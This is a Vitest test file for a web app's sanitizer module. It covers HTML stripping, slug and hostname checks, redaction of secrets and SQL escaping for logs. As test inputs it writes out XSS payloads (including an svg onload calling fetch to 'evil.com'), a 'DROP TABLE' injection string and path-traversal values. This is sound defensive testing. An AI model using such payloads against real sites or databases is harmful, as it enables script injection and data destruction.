import { describe, it, expect } from "vitest";
import {
  escapeSqlForLog,
  isValidHostname,
  isValidSlug,
  sanitizeObject,
  stripHtml,
  truncate,
} from "../../security/sanitizer.js";

// ─── XSS — stripHtml ─────────────────────────────────────────────────────────

describe("stripHtml — XSS payloads", () => {
  const cases = [
    ["<script>alert('xss')</script>", "alert('xss')"],
    ['<img src=x onerror="alert(1)">', ""],
    ["<b>negrito</b>", "negrito"],
    ["<a href='javascript:void(0)'>click</a>", "click"],
    ["texto limpo", "texto limpo"],
    ["<div><p>nested</p></div>", "nested"],
    ["<SCRIPT>evil()</SCRIPT>", "evil()"],
    ['<svg onload="fetch(\'//evil.com\')"/>', ""],
    // atributos evento inline
    ['<input onfocus="steal()" value="ok">', ""],
  ];

  it.each(cases)('stripHtml(%j) → %j', (input, expected) => {
    expect(stripHtml(input)).toBe(expected);
  });
});

// ─── Slug validation ──────────────────────────────────────────────────────────

describe("isValidSlug — aceita e rejeita corretamente", () => {
  const valid = [
    "minha-empresa",
    "startup123",
    "abc",
    "a1b2c3",
    "empresa-do-brasil",
  ];

  const invalid = [
    "",
    "-starts-with-dash",
    "ends-with-dash-",
    "UPPERCASE",
    "com espaço",
    "com_underscore",
    "ponto.separado",
    "a--duplo",
    "../path-traversal",
    "a".repeat(64),
  ];

  it.each(valid)("valid: %s", (slug) => {
    expect(isValidSlug(slug)).toBe(true);
  });

  it.each(invalid)("invalid: %j", (slug) => {
    expect(isValidSlug(slug)).toBe(false);
  });
});

// ─── Hostname validation ──────────────────────────────────────────────────────

describe("isValidHostname", () => {
  it("accepts valid hostnames", () => {
    expect(isValidHostname("meusite.com.br")).toBe(true);
    expect(isValidHostname("app.empresa.io")).toBe(true);
    expect(isValidHostname("sub.domain.example.com")).toBe(true);
  });

  it("rejects invalid hostnames", () => {
    expect(isValidHostname("localhost")).toBe(false); // sem TLD
    expect(isValidHostname("../etc/passwd")).toBe(false);
    expect(isValidHostname("127.0.0.1")).toBe(false);
    expect(isValidHostname("")).toBe(false);
    expect(isValidHostname("has space.com")).toBe(false);
  });
});

// ─── sanitizeObject — mascaramento de campos sensíveis ───────────────────────

describe("sanitizeObject — redacts sensitive fields", () => {
  it("redacts top-level sensitive keys", () => {
    const result = sanitizeObject({
      email: "user@test.com",
      password: "s3cr3t",
      token: "jwt-abc",
    });

    expect(result["email"]).toBe("user@test.com");
    expect(result["password"]).toBe("[REDACTED]");
    expect(result["token"]).toBe("[REDACTED]");
  });

  it("redacts nested sensitive keys recursively", () => {
    const result = sanitizeObject({
      user: {
        name: "Yuri",
        secret: "top-secret",
        auth: { apiKey: "key-123", role: "admin" },
      },
    }) as Record<string, Record<string, unknown>>;

    expect(result["user"]?.["name"]).toBe("Yuri");
    expect(result["user"]?.["secret"]).toBe("[REDACTED]");
    const auth = result["user"]?.["auth"] as Record<string, unknown>;
    expect(auth?.["apiKey"]).toBe("[REDACTED]");
    expect(auth?.["role"]).toBe("admin");
  });

  it("preserves arrays while sanitizing their objects", () => {
    const result = sanitizeObject({
      items: [
        { id: "1", password: "pw1" },
        { id: "2", password: "pw2" },
      ],
    }) as { items: Array<Record<string, unknown>> };

    expect(result.items[0]?.["id"]).toBe("1");
    expect(result.items[0]?.["password"]).toBe("[REDACTED]");
    expect(result.items[1]?.["id"]).toBe("2");
    expect(result.items[1]?.["password"]).toBe("[REDACTED]");
  });

  it("is safe with empty and null values", () => {
    expect(() => sanitizeObject({})).not.toThrow();
    expect(() => sanitizeObject({ a: null, b: undefined })).not.toThrow();
  });
});

// ─── SQL escape para logs ─────────────────────────────────────────────────────

describe("escapeSqlForLog — SQL injection em logs", () => {
  it("escapes single quotes", () => {
    expect(escapeSqlForLog("O'Reilly")).toBe("O\\'Reilly");
  });

  it("escapes semicolons (command termination)", () => {
    expect(escapeSqlForLog("value; DROP TABLE tenants--")).toContain("\\;");
  });

  it("escapes backslashes", () => {
    expect(escapeSqlForLog("C:\\Users")).toBe("C:\\\\Users");
  });

  it("leaves clean strings untouched", () => {
    expect(escapeSqlForLog("normal string 123")).toBe("normal string 123");
  });
});

// ─── truncate ─────────────────────────────────────────────────────────────────

describe("truncate", () => {
  it("does not modify short strings", () => {
    expect(truncate("abc", 10)).toBe("abc");
  });

  it("truncates at exact max length", () => {
    expect(truncate("abcde", 3)).toBe("abc");
  });

  it("handles equal-length string", () => {
    expect(truncate("abc", 3)).toBe("abc");
  });
});
